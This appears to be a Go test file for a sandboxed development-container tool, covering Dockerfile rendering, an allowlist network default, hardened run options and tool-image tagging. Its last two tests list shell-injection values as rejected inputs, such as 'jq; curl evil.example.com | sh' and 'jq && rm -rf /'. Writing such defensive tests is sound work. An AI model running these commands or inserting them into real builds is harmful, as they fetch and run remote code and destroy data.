package project

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mwing/isolated-dev/go/internal/config"
	"github.com/mwing/isolated-dev/go/internal/langs"
)

func loadSet(t *testing.T, body string) *langs.Set {
	t.Helper()
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "golang"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "golang", "language.yaml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "golang", "Dockerfile.template"),
		[]byte("FROM golang:{{VERSION}}\nWORKDIR /workspace\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	set, err := langs.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	return set
}

const goPlugin = `name: golang
versions: ["1.24", "1.26"]
ports: [8080]
registries: [proxy.golang.org, sum.golang.org]
detection:
  files: [go.mod]
  version_files:
    - file: go.mod
      extract: 'go ([0-9]+\.[0-9]+)'
`

func projectDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestSanitizeName(t *testing.T) {
	// Directories with spaces and capitals broke v1's builds.
	// A docker name must begin and end alphanumeric, so trailing
	// separators are not merely ugly: the daemon rejects them.
	cases := map[string]string{
		"My Project":            "my-project",
		"api":                   "api",
		"--weird--":             "weird",
		"my  project":           "my-project",
		"trailing!":             "trailing",
		"":                      "project",
		"!!!":                   "project",
		"Ünïcødé":               "n-c-d",
		strings.Repeat("x", 60): strings.Repeat("x", 40),
	}
	for in, want := range cases {
		if got := SanitizeName(in); got != want {
			t.Errorf("SanitizeName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestResolveUsesProjectDockerfileWhenPresent(t *testing.T) {
	dir := projectDir(t, map[string]string{
		"go.mod":     "module x\n\ngo 1.26\n",
		"Dockerfile": "FROM scratch\n",
	})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if p.FromTemplate {
		t.Error("project Dockerfile should win over the language template")
	}
	body, err := p.RenderedDockerfile()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(body, "FROM scratch") {
		t.Errorf("rendered = %q", body)
	}
}

func TestResolveRendersLanguageTemplateWhenNoDockerfile(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n\ngo 1.26\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if !p.FromTemplate {
		t.Fatal("expected the language template")
	}
	body, err := p.RenderedDockerfile()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(body, "FROM golang:1.26") {
		t.Errorf("version not substituted: %q", body)
	}
	if strings.Contains(body, "{{") {
		t.Errorf("placeholder left unrendered: %q", body)
	}
}

func TestNoDockerfileAndNoLanguageIsAnError(t *testing.T) {
	dir := projectDir(t, map[string]string{"README.md": "hi"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.RenderedDockerfile(); err == nil {
		t.Fatal("expected an error rather than an empty build")
	}
}

func TestNetworkDefaultsToAllowlist(t *testing.T) {
	// Deny by default is the tool's promise; a run that silently had the
	// whole internet would not keep it.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if p.Network != NetworkAllowlist {
		t.Fatalf("network = %q, want allowlist", p.Network)
	}
}

func TestNetworkModeParsing(t *testing.T) {
	for _, in := range []string{"", "allowlist", "open", "none"} {
		if _, err := ParseNetworkMode(in); err != nil {
			t.Errorf("ParseNetworkMode(%q): %v", in, err)
		}
	}
	if _, err := ParseNetworkMode("bridge"); err == nil {
		// v1 accepted bridge/host and did nothing with them; silently
		// accepting it again would imply behavior that does not exist.
		t.Error("v1's bridge mode should be rejected, not silently accepted")
	}
}

func TestRunSpecIsHardenedAndMountsOnlyTheWorkspace(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	spec := p.RunSpec(config.Defaults(), []string{"echo", "hi"}, false)

	args := strings.Join(spec.Args(), " ")
	for _, want := range []string{"--user 1000:1000", "--cap-drop ALL", "--security-opt no-new-privileges:true"} {
		if !strings.Contains(args, want) {
			t.Errorf("missing %q in %s", want, args)
		}
	}
	if len(spec.Mounts) != 1 || spec.Mounts[0].Source != dir {
		t.Errorf("mounts = %+v, want only the workspace", spec.Mounts)
	}
	if err := spec.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
}

func TestPortsComeFromThePluginAndPublishToLoopback(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	spec := p.RunSpec(config.Defaults(), nil, false)
	if len(spec.Ports) != 1 || spec.Ports[0].Container != 8080 {
		t.Fatalf("ports = %+v", spec.Ports)
	}
	if !strings.Contains(strings.Join(spec.Args(), " "), "127.0.0.1:8080:8080") {
		t.Errorf("ports should publish to loopback: %v", spec.Args())
	}
}

func TestRegistriesComeFromThePlugin(t *testing.T) {
	// Allowlist mode needs per-language data, or it is one global list
	// that is either too wide for everyone or too narrow for someone.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	got := p.Registries()
	if len(got) != 2 || got[0] != "proxy.golang.org" {
		t.Fatalf("registries = %v", got)
	}
}

func TestImageNameSurvivesAwkwardDirectoryNames(t *testing.T) {
	base := t.TempDir()
	dir := filepath.Join(base, "My Weird Project")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(p.Image, " ") {
		t.Fatalf("image name has a space: %q", p.Image)
	}
	if !strings.HasPrefix(p.Image, "dev-img-") {
		t.Errorf("image = %q", p.Image)
	}
}

func TestToolsImageTracksContents(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}

	// No tools means no derived image at all.
	if p.ToolsImage(nil) != p.Image {
		t.Errorf("empty list produced a derived tag: %q", p.ToolsImage(nil))
	}

	one := p.ToolsImage([]string{"jq"})
	two := p.ToolsImage([]string{"jq", "ripgrep"})
	if one == two {
		t.Fatal("different tool sets share a tag; the tag would lie about its contents")
	}
	// Order is not content: the same set must reuse the built image.
	if got := p.ToolsImage([]string{"ripgrep", "jq"}); got != two {
		t.Errorf("tag depends on order: %q vs %q", got, two)
	}
}

func TestToolsDockerfileLayersOnTheProjectImage(t *testing.T) {
	df := ToolsDockerfile("dev-img-app", []string{"jq"})
	if !strings.HasPrefix(df, "FROM dev-img-app\n") {
		t.Errorf("tools must layer onto the project image:\n%s", df)
	}
	// A declaration rebuilt into an image, never a committed container.
	if strings.Contains(df, "commit") {
		t.Errorf("unexpected commit:\n%s", df)
	}
	for _, mgr := range []string{"apt-get", "apk", "dnf"} {
		if !strings.Contains(df, mgr) {
			t.Errorf("no %s branch; the image family is not known in advance:\n%s", mgr, df)
		}
	}
}

func TestToolNamesAreValidatedAgainstInjection(t *testing.T) {
	// The list is interpolated into a RUN line, so a name carrying shell
	// metacharacters would execute during the build.
	for _, bad := range []string{
		"jq; curl evil.example.com | sh",
		"jq && rm -rf /",
		"$(whoami)",
		"`id`",
		"jq|tee",
		"",
		"a b",
	} {
		if ValidToolName(bad) {
			t.Errorf("accepted dangerous tool name %q", bad)
		}
	}
	for _, ok := range []string{"jq", "ripgrep", "python3.12", "lib-foo_bar", "g++"} {
		if !ValidToolName(ok) {
			t.Errorf("rejected a legitimate name %q", ok)
		}
	}
}

func TestDangerousToolNameNeverReachesTheDockerfile(t *testing.T) {
	df := ToolsDockerfile("base", []string{"jq; curl evil.example.com | sh"})
	if strings.Contains(df, "evil.example.com") {
		t.Fatalf("injection reached the build:\n%s", df)
	}
}
